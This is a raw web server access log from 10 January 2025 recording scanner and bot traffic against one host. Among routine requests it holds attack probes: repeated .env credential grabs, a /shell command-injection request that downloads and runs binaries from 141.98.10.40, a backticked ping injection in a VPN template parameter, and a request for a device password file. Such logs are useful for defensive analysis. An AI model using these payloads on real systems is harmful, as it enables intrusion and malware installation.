78.153.140.203 - - [10/Jan/2025:09:09:02 +0000] "GET /Public/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36 OPR/43.0.2442.806"
78.153.140.203 - - [10/Jan/2025:09:09:02 +0000] "GET /Server/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24"
78.153.140.203 - - [10/Jan/2025:09:09:03 +0000] "GET /Shared/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.10 (maverick) Firefox/3.6.18"
78.153.140.203 - - [10/Jan/2025:09:09:03 +0000] "GET /Site/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b4pre) Gecko/2008020708 Firefox/3.0b4pre"
78.153.140.203 - - [10/Jan/2025:09:09:04 +0000] "GET /Stage/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
78.153.140.203 - - [10/Jan/2025:09:09:04 +0000] "GET /Staging/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15"
78.153.140.203 - - [10/Jan/2025:09:09:04 +0000] "GET /Upload/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.0.4) Gecko/2008111710 Firefox/3.0.4"
78.153.140.203 - - [10/Jan/2025:09:09:05 +0000] "GET /Vendor/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.3; en-us; Galaxy Nexus Build/JWR66Y) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [10/Jan/2025:09:09:05 +0000] "GET /Web/.env HTTP/1.1" 302 331 "-" "Opera/8.50 (Windows 98; U; ru)"
95.214.55.226 - - [10/Jan/2025:09:09:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [10/Jan/2025:09:24:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
114.32.4.181 - - [10/Jan/2025:09:25:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
141.98.11.119 - - [10/Jan/2025:09:29:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/141.98.10.40/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/141.98.10.40/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
98.96.216.126 - - [10/Jan/2025:09:30:28 +0000] "CONNECT www.baidu.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
46.19.138.234 - - [10/Jan/2025:09:41:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
89.187.32.115 - - [10/Jan/2025:09:54:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
86.166.72.83 - - [10/Jan/2025:09:54:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [10/Jan/2025:09:55:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:09:55:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.162.231.204 - - [10/Jan/2025:10:05:35 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
139.162.231.204 - - [10/Jan/2025:10:05:35 +0000] "\x16\x03\x01" 400 524 "-" "-"
139.162.231.204 - - [10/Jan/2025:10:05:36 +0000] "\x16\x03\x01" 400 524 "-" "-"
139.162.231.204 - - [10/Jan/2025:10:05:36 +0000] "\x16\x03\x01" 400 524 "-" "-"
193.34.212.75 - - [10/Jan/2025:10:07:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [10/Jan/2025:10:23:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:10:23:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
154.213.184.132 - - [10/Jan/2025:10:27:31 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
147.185.133.234 - - [10/Jan/2025:10:36:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.242.226.10 - - [10/Jan/2025:10:57:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
205.210.31.145 - - [10/Jan/2025:11:05:17 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.145 - - [10/Jan/2025:11:05:18 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.93 - - [10/Jan/2025:11:12:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:11:12:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [10/Jan/2025:11:17:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
93.174.93.12 - - [10/Jan/2025:11:18:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.172 Safari/537.36 Vivaldi/2.5.1525.48"
95.214.53.198 - - [10/Jan/2025:11:47:16 +0000] "GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60ping+-c+1+95.214.54.154%60 HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:11:49:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:11:49:38 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:12:02:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:12:02:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
125.229.31.216 - - [10/Jan/2025:12:45:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [10/Jan/2025:12:49:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
139.59.101.104 - - [10/Jan/2025:12:50:26 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.93 - - [10/Jan/2025:13:24:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:13:24:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
31.13.224.222 - - [10/Jan/2025:13:26:53 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
13.64.192.170 - - [10/Jan/2025:13:29:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
185.16.39.104 - - [10/Jan/2025:13:35:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [10/Jan/2025:13:39:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [10/Jan/2025:13:49:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
81.161.238.40 - - [10/Jan/2025:13:51:22 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
95.214.53.198 - - [10/Jan/2025:14:01:54 +0000] "GET /cgi-bin/webra_fcgi.fcgi?action=get_info&menu=login.passwd HTTP/1.1" 302 350 "-" "Linux Gnu (cow)"
179.43.191.146 - - [10/Jan/2025:14:04:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [10/Jan/2025:14:08:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:14:08:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:14:21:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:14:21:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:14:34:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:14:34:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [10/Jan/2025:15:10:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
102.131.60.115 - - [10/Jan/2025:15:30:41 +0000] "\x16\x03\x01\x01\xaa\x01" 400 524 "-" "-"
87.120.125.126 - - [10/Jan/2025:15:35:22 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3436.0 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:15:48:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:15:48:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:15:50:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:15:50:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
102.131.60.115 - - [10/Jan/2025:15:58:00 +0000] "GET /admin/config.php HTTP/1.0" 302 350 "-" "xfa1"
5.181.190.248 - - [10/Jan/2025:15:59:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
91.223.3.201 - - [10/Jan/2025:16:24:48 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [10/Jan/2025:16:31:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.128.54.126 - - [10/Jan/2025:17:00:33 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [10/Jan/2025:17:00:44 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
159.223.69.51 - - [10/Jan/2025:17:08:54 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [10/Jan/2025:17:09:03 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
159.223.69.51 - - [10/Jan/2025:17:14:31 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.93 - - [10/Jan/2025:17:14:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:17:14:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
159.223.69.51 - - [10/Jan/2025:17:14:39 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
178.128.54.126 - - [10/Jan/2025:17:15:17 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [10/Jan/2025:17:15:24 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
118.9.228.113 - - [10/Jan/2025:17:21:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
178.215.236.132 - - [10/Jan/2025:17:41:32 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
5.181.190.248 - - [10/Jan/2025:17:47:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.93 - - [10/Jan/2025:17:48:49 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.34.212.75 - - [10/Jan/2025:17:54:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
45.156.130.45 - - [10/Jan/2025:17:59:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.55.226 - - [10/Jan/2025:18:05:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
60.135.148.175 - - [10/Jan/2025:18:37:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:18:38:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:18:38:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [10/Jan/2025:18:38:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [10/Jan/2025:18:39:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:18:39:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
93.174.93.12 - - [10/Jan/2025:18:42:56 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
122.116.53.89 - - [10/Jan/2025:19:27:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:19:33:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:19:33:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
59.5.31.188 - - [10/Jan/2025:19:35:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
172.105.128.13 - - [10/Jan/2025:19:45:27 +0000] "\x16\x03\x01" 400 524 "-" "-"
193.200.78.250 - - [10/Jan/2025:19:54:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.104.210.105 - - [10/Jan/2025:20:01:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [10/Jan/2025:20:01:51 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:20:33:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:20:33:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.121.79.3 - - [10/Jan/2025:20:38:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [10/Jan/2025:20:53:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
179.43.191.146 - - [10/Jan/2025:20:53:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
125.228.126.78 - - [10/Jan/2025:20:59:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [10/Jan/2025:21:03:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.200.78.250 - - [10/Jan/2025:21:06:05 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.93 - - [10/Jan/2025:21:18:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:21:18:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
211.223.134.88 - - [10/Jan/2025:21:22:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.149 - - [10/Jan/2025:21:49:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:21:49:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [10/Jan/2025:22:05:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [10/Jan/2025:22:22:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:22:22:13 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [10/Jan/2025:22:23:04 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.181.190.248 - - [10/Jan/2025:22:24:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.200.78.250 - - [10/Jan/2025:22:42:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.130.4 - - [10/Jan/2025:22:52:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.130.4 - - [10/Jan/2025:22:52:45 +0000] "GET /css/images/PTZOptics_powerby.png HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
93.174.93.12 - - [10/Jan/2025:22:57:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre"
78.153.140.93 - - [10/Jan/2025:22:59:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:22:59:13 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [10/Jan/2025:23:20:53 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [10/Jan/2025:23:20:56 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.180.140.102 - - [10/Jan/2025:23:37:24 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.3.223.55 - - [10/Jan/2025:23:39:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [10/Jan/2025:23:40:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:23:40:25 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:23:44:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:23:44:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
